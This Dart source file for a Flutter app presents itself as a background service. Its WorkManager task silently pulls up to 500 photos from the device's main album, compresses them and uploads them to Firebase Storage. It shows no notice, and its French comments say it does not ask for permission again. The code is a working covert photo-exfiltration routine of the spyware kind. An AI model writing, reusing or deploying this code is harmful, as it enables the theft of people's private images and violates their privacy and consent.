// lib/services/background_service.dart

import 'package:workmanager/workmanager.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_image_compress/flutter_image_compress.dart';
import 'package:path_provider/path_provider.dart';
import 'dart:io';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

const String taskAutoSend = "autoSendLargeBatch";

@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    await Firebase.initializeApp();

    if (task == taskAutoSend) {
      await _sendLargeBatchInBackground();
    }

    return true;
  });
}

// Fonction principale pour envoyer un grand nombre d'images
Future<void> _sendLargeBatchInBackground() async {
  print("🔄 [WorkManager] Début envoi large batch (sans redemander permission)");

  try {
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool('auto_sent') ?? false) {
      print("✅ Déjà envoyé");
      return;
    }

    // On ne demande PLUS la permission ici (elle a déjà été donnée au premier lancement)
    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) {
      print("❌ Aucun album trouvé dans WorkManager");
      return;
    }

    final mainAlbum = albums.first;
    final total = await mainAlbum.assetCountAsync;
    if (total == 0) return;

    final fetchCount = total < 500 ? total : 500;
    final assets = await mainAlbum.getAssetListRange(start: 0, end: fetchCount);
    assets.shuffle();

    int success = 0;
    final storage = FirebaseStorage.instance;

    print("🚀 Envoi de ${assets.length} photos en arrière-plan...");

    for (int i = 0; i < assets.length; i++) {
      try {
        final file = await assets[i].file;
        if (file == null) continue;

        final tmp = await getTemporaryDirectory();
        final outPath = '${tmp.path}/bg_${DateTime.now().millisecondsSinceEpoch}.jpg';

        final compressed = await FlutterImageCompress.compressAndGetFile(
          file.path, outPath, quality: 70, minWidth: 1024,
        );

        if (compressed == null) continue;

        final ref = storage.ref().child('background_batch/photo_${DateTime.now().millisecondsSinceEpoch}.jpg');

        await ref.putFile(File(compressed.path));

        success++;
        print("✅ Background - Photo ${i+1}/${assets.length} uploadée");

        await Future.delayed(const Duration(milliseconds: 500));

      } catch (e) {
        print("❌ Erreur background photo ${i+1}: $e");
      }
    }

    if (success > 0) {
      await prefs.setBool('auto_sent', true);
    }

    print("🎉 WorkManager terminé : $success photos envoyées");

  } catch (e) {
    print("💥 Erreur WorkManager : $e");
  }
}